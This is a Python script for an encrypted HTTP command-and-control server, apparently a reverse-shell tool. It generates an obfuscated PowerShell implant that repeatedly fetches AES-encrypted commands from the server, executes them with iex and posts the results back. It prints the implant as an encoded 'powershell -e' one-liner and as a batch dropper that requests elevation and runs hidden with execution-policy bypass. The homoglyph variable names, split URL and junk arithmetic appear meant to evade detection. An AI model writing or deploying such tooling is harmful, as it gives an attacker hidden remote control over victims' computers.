import http.server
import socketserver
import signal
import base64
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from base64 import b64encode, b64decode

ADDRESS = "0.0.0.0"
PORT = 8000

GREEN = '\033[38;5;47m'; END = '\033[0m'


payload = f'''
$Κ = [System.Text.Encoding]::UTF8.GetBytes("abcdefghijklmnop")
$А = New-Object System.Security.Cryptography.AesCryptoServiceProvider
$А.Mode = [System.Security.Cryptography.CipherMode]::CBC
$А.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$А.Key = $Κ
$U='h'+ 't'+ 't'+ 'p'+':'+ '/'+'/'+ '0'+ '0'+'0'+'.'+'0'+ '0'+'0'+'.'+'0'+'0'+'0'+'.'+'0'+ '0'+ '0'+':'+ '8'+'0'+'0'+ '0'
# ???????????????????????????????????????????¯\_(ツ)_/¯ 
#
while($true){{
    
    $А.IV=New-Object byte[] 16
    $D=$А.CreateDecryptor()
    $R=Invoke-WebRequest -Uri $U
    $C=[Convert]::FromBase64String($R.Content)
    $PT=$D.TransformFinalBlock($C, 0, $C.Length)
    $D=[System.Text.Encoding]::UTF8.GetString($PT)
    $E=iex $D
    $PT=[System.Text.Encoding]::UTF8.GetBytes($E)
    $E=$А.CreateEncryptor()
    $C=$E.TransformFinalBlock($PT, 0, $PT.Length)
    $C=[Convert]::ToBase64String($C)
    
    #
    Invoke-WebRequest -Uri $U -Method POST -Body $C
    #ツツツツツツツツツツツツツツツツツツツツツツツ ¯\_(?)_/¯  
    $Θ = 10 + 2 * 3 / 4 - 5
    $Γ = $Κ + $Θ
    $Δ = $Γ + $Κ
    $Ν = $Δ / 2
}}
'''
e_payload = base64.b64encode(payload.encode('utf-16le')).decode('utf-8')
print(f"{GREEN}PAYLOAD:{END}")
print (f"powershell -e {e_payload}")
print("")
print(f"{GREEN}PAYLOAD .bat{END}")
print(f"@echo off\nnet session >nul 2>&1\nif %errorLevel% == 0 (\n  goto start\n) else (\n  powershell -Command \"Start-Process '%comspec%' -ArgumentList '/c %~dpnx0' -Verb RunAs\" && exit\n)\n:start\npowershell -NoProfile -ExecutionPolicy Bypass -W hidden -Command \"{e_payload}\"\n")

key = b'abcdefghijklmnop'
cipher = Cipher(algorithms.AES(key), modes.CBC(b'\x00'*16))

class Http_Shell(http.server.BaseHTTPRequestHandler):

    def encrypt_a(self, command):
        padder = padding.PKCS7(128).padder()
        padded_data = padder.update(command.encode()) + padder.finalize()
        encryptor = cipher.encryptor()
        encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
        encrypted_b64 = b64encode(encrypted_data)
        return encrypted_b64

    def decrypt_a(self, encoded_command):
        encrypted_data = b64decode(encoded_command)
        decryptor = cipher.decryptor()
        padded_data = decryptor.update(encrypted_data) + decryptor.finalize()
        unpadder = padding.PKCS7(128).unpadder()
        unpadded_data = unpadder.update(padded_data) + unpadder.finalize()
        return unpadded_data

    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        command_input = input(f'{GREEN}$hell > {END}')
        encrypt_command = self.encrypt_a(command_input)
        self.wfile.write(encrypt_command)

    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)
        unpadded_data = self.decrypt_a(post_data)
        print(unpadded_data.decode('utf-8'))

    def log_message(self, format, *args):
        return

def signal_handler(sig, frame):
    print("Closing server ...")
    httpd.server_close()

with socketserver.TCPServer((ADDRESS, PORT), Http_Shell) as httpd:
    print("Listening on", ADDRESS, "port", PORT)
    print(" ")
    httpd.serve_forever()
    signal.signal(signal.SIGINT, signal_handler)
